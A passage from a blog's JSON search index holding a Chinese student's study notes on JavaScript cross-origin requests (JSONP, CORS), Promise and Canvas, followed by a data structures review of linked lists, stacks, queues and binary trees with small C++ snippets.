处在于需要服务器端额外做开发。</p>\n<p>第三种方式称为JSONP，它有个限制，只能用GET请求，并且要求返回JavaScript。这种方式跨域实际上是利用了浏览器允许跨域引用JavaScript资源：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;abc.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">...</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n<p>JSONP通常以函数调用的形式返回，例如，返回JavaScript内容如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo(&#39;data&#39;);</span><br></pre></td></tr></table></figure>\n<p>这样一来，我们如果在页面中先准备好<code>foo()</code>函数，然后给页面动态加一个<code>&lt;script&gt;</code>节点，相当于动态读取外域的JavaScript资源，最后就等着接收回调了。</p>\n<p>以163的股票查询URL为例，对于URL：<a href=\"http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPrice，你将得到如下返回：\" target=\"_blank\" rel=\"noopener\">http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPrice，你将得到如下返回：</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">refreshPrice(&#123;&quot;0000001&quot;:&#123;&quot;code&quot;: &quot;0000001&quot;, ... &#125;);</span><br></pre></td></tr></table></figure>\n<p>因此我们需要首先在页面中准备好回调函数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function refreshPrice(data) &#123;</span><br><span class=\"line\">    var p &#x3D; document.getElementById(&#39;test-jsonp&#39;);</span><br><span class=\"line\">    p.innerHTML &#x3D; &#39;当前价格：&#39; +</span><br><span class=\"line\">        data[&#39;0000001&#39;].name +&#39;: &#39; + </span><br><span class=\"line\">        data[&#39;0000001&#39;].price + &#39;；&#39; +</span><br><span class=\"line\">        data[&#39;1399001&#39;].name + &#39;: &#39; +</span><br><span class=\"line\">        data[&#39;1399001&#39;].price;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当前价格：上证指数: 3310.01；深证成指: 13637.883</p>\n<p>刷新</p>\n<p>最后用<code>getPrice()</code>函数触发：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function getPrice() &#123;</span><br><span class=\"line\">    var</span><br><span class=\"line\">        js &#x3D; document.createElement(&#39;script&#39;),</span><br><span class=\"line\">        head &#x3D; document.getElementsByTagName(&#39;head&#39;)[0];</span><br><span class=\"line\">    js.src &#x3D; &#39;http:&#x2F;&#x2F;api.money.126.net&#x2F;data&#x2F;feed&#x2F;0000001,1399001?callback&#x3D;refreshPrice&#39;;</span><br><span class=\"line\">    head.appendChild(js);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>就完成了跨域加载数据。</p>\n<p><strong>CORS</strong></p>\n<p>CORS全称Cross-Origin Resource Sharing</p>\n<p>本域：Origin，也就是浏览器当前页面的域。</p>\n<p>外域：指向的访问网页</p>\n<p>当JavaScript向外域发起请求后，浏览器收到响应后，首先检查<code>Access-Control-Allow-Origin</code>是否包含本域，如果是，则此次跨域请求成功，如果不是，则请求失败，JavaScript将无法获取到响应的任何数据。</p>\n<p><img src=\"/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200801154253687.png\" alt=\"image-20200801154253687\"></p>\n<h2 id=\"Promise\"><a href=\"#Promise\" class=\"headerlink\" title=\"Promise\"></a>Promise</h2><p>Promise对象先统一执行AJAX逻辑，不关心如何处理结果，然后，根据结果是成功还是失败，在将来的某个时候调用<code>success</code>函数或<code>fail</code>函数。</p>\n<p><img src=\"/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200801155554430.png\" alt=\"image-20200801155554430\"></p>\n<p><strong>对Promise和AJAX理解还不是很深刻，回头继续看。</strong></p>\n<h2 id=\"Canvas\"><a href=\"#Canvas\" class=\"headerlink\" title=\"Canvas\"></a>Canvas</h2><p>Canvas是HTML5新增的组件，它就像一块幕布，可以用JavaScript在上面绘制各种图表、动画等。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML代码 --&gt;</span><br><span class=\"line\">&lt;canvas id&#x3D;&quot;test-canvas&quot; width&#x3D;&quot;200&quot; heigth&#x3D;&quot;100&quot;&gt;</span><br><span class=\"line\">    &lt;p&gt;你的浏览器不支持Canvas&lt;&#x2F;p&gt;</span><br><span class=\"line\">&lt;&#x2F;canvas&gt;</span><br></pre></td></tr></table></figure>\n<hr>\n<p><strong>后面的jQuery，Node.js和React之后再看。</strong></p>\n","categories":["前端"],"tags":["web"]},{"title":"数据结构复习","url":"https://pz1o.top/2020/06/30/数据结构复习/","content":"<a id=\"more\"></a>\n<h1 id=\"数据结构复习\"><a href=\"#数据结构复习\" class=\"headerlink\" title=\"数据结构复习\"></a>数据结构复习</h1><p>根据老师重点，复习数据结构。</p>\n<h1 id=\"线性表\"><a href=\"#线性表\" class=\"headerlink\" title=\"线性表\"></a>线性表</h1><h2 id=\"循环链表\"><a href=\"#循环链表\" class=\"headerlink\" title=\"循环链表\"></a>循环链表</h2><p><strong>循环链表的产生：在单链表中，（1）只知道一个结点，想知道所有结点是不太行的。（2）如果要找一个结点的直接前驱结点，需要从表端一个一个结点查找，时间开销到达了O（n）。</strong></p>\n<h3 id=\"循环链表的概念\"><a href=\"#循环链表的概念\" class=\"headerlink\" title=\"循环链表的概念\"></a>循环链表的概念</h3><p>将单链表的首尾相连，使终端结点的指针域指向头结点，构成<strong>单向循环链表。</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630163907428.png\" alt=\"image-20200630163907428\"></p>\n<p>循环链表中可以带头指针和尾指针。</p>\n<p>头指针：</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164302095.png\" alt=\"image-20200630164302095\"></p>\n<p>尾指针：</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164326659.png\" alt=\"image-20200630164326659\"></p>\n<h3 id=\"循环链表的插入\"><a href=\"#循环链表的插入\" class=\"headerlink\" title=\"循环链表的插入\"></a>循环链表的插入</h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630164711122.png\" alt=\"image-20200630164711122\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//具体操作</span></span><br><span class=\"line\">s-&gt;link = p-&gt;link;</span><br><span class=\"line\">p-&gt;link = s;</span><br></pre></td></tr></table></figure>\n<h2 id=\"双向链表\"><a href=\"#双向链表\" class=\"headerlink\" title=\"双向链表\"></a>双向链表</h2><p><strong>双向链表的产生：解决单链表中的（2）</strong></p>\n<h3 id=\"双向链表的概念\"><a href=\"#双向链表的概念\" class=\"headerlink\" title=\"双向链表的概念\"></a>双向链表的概念</h3><p>双向链表中的每个结点都有<strong>一个前驱指针和一个后继指针和数据域</strong>。</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630170548596.png\" alt=\"image-20200630170548596\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; p-&gt;rlink-&gt;llink &#x3D; p-&gt;llink-&gt;rlink;</span><br></pre></td></tr></table></figure>\n<h3 id=\"双向链表的插入\"><a href=\"#双向链表的插入\" class=\"headerlink\" title=\"双向链表的插入\"></a>双向链表的插入</h3><p>双向链表的插入分为<strong>前驱方向的插入和后继方向的插入‘</strong>。</p>\n<p><strong>后继:</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630171322422.png\" alt=\"image-20200630171322422\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;具体操作</span><br><span class=\"line\">newnode-&gt;rlink &#x3D; current-&gt;rlink;</span><br><span class=\"line\">current-&gt;rlink &#x3D; newnode;</span><br><span class=\"line\">newnode-&gt;rlink-&gt;llink &#x3D; newnode;</span><br><span class=\"line\">newnode-&gt;llink &#x3D; current;</span><br></pre></td></tr></table></figure>\n<p><strong>前驱（相当于反向的后继）：</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630171637079.png\" alt=\"image-20200630171637079\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;具体操作</span><br><span class=\"line\">newnode-&gt;llink &#x3D; current-&gt;llink;</span><br><span class=\"line\">current-&gt;llink &#x3D; newnode;</span><br><span class=\"line\">newnode-&gt;llink-&gt;rlink &#x3D; newnode;</span><br><span class=\"line\">newnode-&gt;rlink &#x3D; current;</span><br></pre></td></tr></table></figure>\n<h3 id=\"双向链表的删除\"><a href=\"#双向链表的删除\" class=\"headerlink\" title=\"双向链表的删除\"></a>双向链表的删除</h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630173056989.png\" alt=\"image-20200630173056989\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;具体操作</span><br><span class=\"line\">current-&gt;rlink-&gt;llink &#x3D; current-&gt;llink;</span><br><span class=\"line\">current-&gt;llink-&gt;rlink &#x3D; current-&gt;rlink;</span><br></pre></td></tr></table></figure>\n<h1 id=\"栈\"><a href=\"#栈\" class=\"headerlink\" title=\"栈\"></a>栈</h1><p><strong>栈的定义</strong></p>\n<p>只允许在一端插入和删除的线性表。<strong>（后进先出）</strong></p>\n<p><strong>栈顶：允许插入和删除的一端。</strong></p>\n<p><strong>栈底：不允许插入和删除的一端。</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630215456726.png\" alt=\"image-20200630215456726\"></p>\n<h2 id=\"顺序栈\"><a href=\"#顺序栈\" class=\"headerlink\" title=\"顺序栈\"></a>顺序栈</h2><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630220043153.png\" alt=\"image-20200630220043153\"></p>\n<p>栈顶指针top=maxsize-1，则表示栈满。</p>\n<h3 id=\"列车调度问题\"><a href=\"#列车调度问题\" class=\"headerlink\" title=\"列车调度问题\"></a><strong>列车调度问题</strong></h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630221711583.png\" alt=\"image-20200630221711583\"></p>\n<p>如上图所述，有多少种不同的出栈序列？</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">F(n)&#x3D;F(0)*F(n-1)+F(1)*F(n-2)+...+F(n-1)*F(n-n)</span><br><span class=\"line\">F(0)&#x3D;1</span><br><span class=\"line\">F(1)&#x3D;F(0)*F(0)&#x3D;1</span><br><span class=\"line\">F(2)&#x3D;F(0)*F(2-1)+F(0)*F(2-2)&#x3D;2</span><br><span class=\"line\">F(3)&#x3D;F(0)*F(3-1)+F(1)*F(3-2)+F(2)*F(3-3)&#x3D;5</span><br><span class=\"line\">F(4)&#x3D;F(0)*F(4-1)+F(1)*F(4-2)+F(2)*F(4-3)+F(3)*F(4-4)&#x3D;14</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630223541131.png\" alt=\"image-20200630223541131\"></p>\n<p><strong>在1423序列中，我们观察子序列423，发现2夹在4和3之间，即最大的数先出栈，最小的数中间出栈，中间的数最后出栈——这无论如何不可能出现，因为它违反栈“后进先出”的特点；同样2413序列中1夹在4和3之间，3412序列中1夹在4和2之间，4312序列中1夹在3和2之间，这都违反LOFI规律。</strong></p>\n<h2 id=\"链式栈\"><a href=\"#链式栈\" class=\"headerlink\" title=\"链式栈\"></a>链式栈</h2><p>用单链表来表示栈，为链式栈。</p>\n<ul>\n<li>链式栈无栈满问题。</li>\n<li><strong>链式栈的栈顶在链头</strong>。</li>\n<li>插入和删除在栈顶执行。</li>\n</ul>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630224640113.png\" alt=\"image-20200630224640113\"></p>\n<p><strong>*括号匹配</strong></p>\n<p><strong>*中缀表达式转换成后缀表达式</strong></p>\n<ol>\n<li>除左括号和右括号外，同一操作符栈内优先级大于栈外优先级。</li>\n<li>若栈外操作符优先级大于栈内操作符，则栈外操作符进栈；否则，出栈。</li>\n<li><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200630231145799.png\" alt=\"image-20200630231145799\"></li>\n</ol>\n<h2 id=\"栈与递归\"><a href=\"#栈与递归\" class=\"headerlink\" title=\"栈与递归\"></a>栈与递归</h2><ol>\n<li>定义是递归的（斐波那契数列）</li>\n<li>数据结构是递归的（树，链表）</li>\n<li>问题解法是递归的</li>\n</ol>\n<h3 id=\"汉诺塔问题\"><a href=\"#汉诺塔问题\" class=\"headerlink\" title=\"汉诺塔问题\"></a>汉诺塔问题</h3><ol>\n<li>用 C 柱做过渡，将 A 柱上的 (n-1) 个盘子移到 B 柱上；</li>\n<li>将 A 柱上最后一个盘子直接移到 C 柱上；</li>\n<li>用 A 柱做过渡，将 B 柱上的 (n-1) 个盘子移到 C 柱上。</li>\n</ol>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701140602693.png\" alt=\"image-20200701140602693\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Hanoi</span><span class=\"params\">(<span class=\"keyword\">int</span> n,<span class=\"keyword\">char</span> a,<span class=\"keyword\">char</span> b,<span class=\"keyword\">char</span> c)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">move</span>(n,A,C);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    Hanoi(n<span class=\"number\">-1</span>,A,C,B);</span><br><span class=\"line\">    <span class=\"built_in\">move</span>(n,A,C);</span><br><span class=\"line\">    Hanoi(n<span class=\"number\">-1</span>,B,A,C);</span><br><span class=\"line\">  &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">move</span><span class=\"params\">(<span class=\"keyword\">int</span> n,<span class=\"keyword\">char</span> A,<span class=\"keyword\">char</span> C)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Move \"</span>&lt;&lt; n &lt;&lt;<span class=\"string\">\"From \"</span>&lt;&lt; A &lt;&lt;<span class=\"string\">\"To \"</span>&lt;&lt; C;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"队列\"><a href=\"#队列\" class=\"headerlink\" title=\"队列\"></a>队列</h1><p><strong>队列的定义</strong>：</p>\n<p>只允许在一端删除，在另一端插入的线性表。（<strong>先进先出</strong>）</p>\n<p><strong>队头</strong>：允许删除的=一端。</p>\n<p><strong>队尾</strong>：允许插入的一端。</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701141927370.png\" alt=\"image-20200701141927370\"></p>\n<h2 id=\"循环队列\"><a href=\"#循环队列\" class=\"headerlink\" title=\"循环队列\"></a>循环队列</h2><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701142027568.png\" alt=\"image-20200701142027568\"></p>\n<ol>\n<li>队列初始化：=front = rear = 0;</li>\n<li>队头指针进1:  front = (front+1) % maxSize;</li>\n<li>队尾指针进1:  rear = (rear+1) % maxSize;</li>\n<li>队空条件：front == rear;</li>\n<li>队满条件：<strong>(rear+1) % maxSize == front</strong> ;</li>\n<li>循环队列只能存放<strong>（maxSize-1）</strong>个元素；</li>\n<li>循环队列中元素的个数为：<strong>(rear-front+maxSize)%maxSize;</strong></li>\n</ol>\n<h2 id=\"链式队列\"><a href=\"#链式队列\" class=\"headerlink\" title=\"链式队列\"></a>链式队列</h2><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701143456590.png\" alt=\"image-20200701143456590\"></p>\n<ol>\n<li>队头在链头，队尾在链尾。</li>\n<li>队空为 front == NULL</li>\n</ol>\n<h1 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h1><p><strong>数组的存储表示：</strong></p>\n<p>设第一个数组元素的存储地址为a，每一个数组元素的存储大小为l</p>\n<p>在一维数组中：$LOC(i)=a+i*l$</p>\n<p>在二维数组中,按照行优先存储，每一行最多存储元素为m个：$LOC(j,k)=a+(j*m+k)l$</p>\n<h1 id=\"散列表\"><a href=\"#散列表\" class=\"headerlink\" title=\"散列表\"></a>散列表</h1><h1 id=\"树\"><a href=\"#树\" class=\"headerlink\" title=\"树\"></a>树</h1><h2 id=\"树的基本概念\"><a href=\"#树的基本概念\" class=\"headerlink\" title=\"树的基本概念\"></a>树的基本概念</h2><p><strong>结点的层次</strong>：根节点在第一层，其他类推。</p>\n<p><strong>深度</strong>：树中距离根结点最远的结点所在的层次叫做树的深度。</p>\n<p><strong>高度</strong>：高度与深度数值相等，但方向不同。根节点的高度就叫做树的高度。</p>\n<p><strong>结点的度</strong>：结点所拥有的子树棵树。</p>\n<p><strong>树的度</strong>：树中结点的度的最大值。</p>\n<h2 id=\"二叉树\"><a href=\"#二叉树\" class=\"headerlink\" title=\"二叉树\"></a>二叉树</h2><h3 id=\"二叉树的定义\"><a href=\"#二叉树的定义\" class=\"headerlink\" title=\"二叉树的定义\"></a><strong>二叉树的定义</strong></h3><ol>\n<li>每个结点最多有两棵子树</li>\n<li>左子树和右子树不可颠倒</li>\n</ol>\n<p>二叉树的五种形态：</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701171507765.png\" alt=\"image-20200701171507765\"></p>\n<h3 id=\"二叉树的性质\"><a href=\"#二叉树的性质\" class=\"headerlink\" title=\"二叉树的性质\"></a>二叉树的性质</h3><ol>\n<li><strong>二叉树的第i层最多有$2^{i-1}$个结点</strong></li>\n<li><strong>深度为k的二叉树最少有k个结点，最多有$2^k-1$个结点</strong></li>\n<li>对任何一棵二叉树，如果其叶结点有 n0 个, 度为 2 的非叶结点有 n2 个,   则有<strong>n0＝n2＋1</strong></li>\n<li>具有 n (n≥0) 个结点的完全二叉树的深度为 <strong>$\\lceil log2(n+1)\\rceil$</strong></li>\n<li>如将一棵有n个结点的完全二叉树自顶向下，同一层自左向右连续给结点编号1, 2, …, n，则有以下关系：<br>若i = 1, 则 i 无双亲<br><strong>若i &gt; 1, 则 i 的双亲为$\\lfloor i／2\\rfloor$</strong><br><strong>i 的左子女为 2 <em>i(如果i有左子女的话)，                             i 的右子女为2 </em>i+1 (如果i有右子女的话)</strong><br>若 i 为奇数, 且i != 1, 则其左兄弟为i-1,<br>若 i 为偶数, 且i != 1, 则其右兄弟为i+1</li>\n</ol>\n<h3 id=\"满二叉树\"><a href=\"#满二叉树\" class=\"headerlink\" title=\"满二叉树\"></a>满二叉树</h3><p>每一层结点都达到了最大个数的二叉树。深度为k的满二叉树有$2^k-1$个。</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701211006705.png\" alt=\"image-20200701211006705\"></p>\n<h3 id=\"完全二叉树\"><a href=\"#完全二叉树\" class=\"headerlink\" title=\"完全二叉树\"></a>完全二叉树</h3><p>若设二叉树的深度为 k，则共有 k 层。除第 k 层外，其它各层 (1—k-1) 的结点数都达到最大个数，第k层从<strong>右向左连续缺若干结点</strong>，这就是完全二叉树。<strong>（区分非完全二叉树）</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701211039265.png\" alt=\"image-20200701211039265\"></p>\n<h2 id=\"二叉树的存储表示\"><a href=\"#二叉树的存储表示\" class=\"headerlink\" title=\"二叉树的存储表示\"></a>二叉树的存储表示</h2><h3 id=\"顺序存储\"><a href=\"#顺序存储\" class=\"headerlink\" title=\"顺序存储\"></a>顺序存储</h3><p>完全二叉树</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701213812241.png\" alt=\"image-20200701213812241\"></p>\n<p>非完全二叉树</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701213920390.png\" alt=\"image-20200701213920390\"></p>\n<p>问：顺序存储后能否复原成唯一对应的二叉树形状？</p>\n<p>答：若是完全/满二叉树则可以做到唯一复原。 因为根据性质5：可知结点i，左孩子的下标值必为2i， 其右孩子的下标值必为2i＋1. 非完全二叉树要将各层空缺处统统补上“虚结点”，其内容为空。</p>\n<h3 id=\"链表存储\"><a href=\"#链表存储\" class=\"headerlink\" title=\"链表存储\"></a>链表存储</h3><p>二叉树结点定义：</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701214456124.png\" alt=\"image-20200701214456124\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701214613689.png\" alt=\"image-20200701214613689\"></p>\n<p><strong>含n个结点的二叉链表其中空指针域为n+1个，非空指针域为n-1个</strong>。</p>\n<h2 id=\"二叉树遍历\"><a href=\"#二叉树遍历\" class=\"headerlink\" title=\"二叉树遍历\"></a>二叉树遍历</h2><p>==二叉树的遍历就是按某种次序访问树中的结点，要求每个结点访问一次且仅访问一次。==</p>\n<h3 id=\"二叉树遍历的递归算法\"><a href=\"#二叉树遍历的递归算法\" class=\"headerlink\" title=\"二叉树遍历的递归算法\"></a>二叉树遍历的递归算法</h3><p>对根的访问时机不同，有三种实现方案：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VLR（前序）</span><br><span class=\"line\">LVR（中序）</span><br><span class=\"line\">LRV（后序）</span><br></pre></td></tr></table></figure>\n<p><strong>前序遍历二叉树</strong></p>\n<p><strong>若二叉树为空，则 空操作；否则 (1) 访问根结点； (2) 先序遍历左子树； (3) 先序遍历右子树。</strong></p>\n<p><strong>中序遍历二叉树</strong></p>\n<p><strong>若二叉树为空， 则空操作；否则 (1) 中序遍历 左子树； (2) 访问根结点； (3) 中序遍历右子树</strong>。</p>\n<p><strong>后序遍历二叉树</strong></p>\n<p><strong>若二叉树为空，则 空操作；否则 (1) 后序遍历 左子树； (2) 后序遍历 右子树； (3) 访问根结点</strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//前序遍历</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">preOrder</span><span class=\"params\">(BiTree T)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(T)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; T-&gt;data &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\tpreOrder(T-&gt;lchild);</span><br><span class=\"line\">\t\tpreOrder(T-&gt;rchild);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//中序和后序看访问的次序</span></span><br></pre></td></tr></table></figure>\n<p><strong>二叉树算法设计练习</strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//二叉树算法设计练习</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//设计算法按前序次序打印二叉树中的叶子结点。</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">PreOrder</span><span class=\"params\">(BiNode *root)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (root == <span class=\"literal\">NULL</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (root-&gt;lchild ==<span 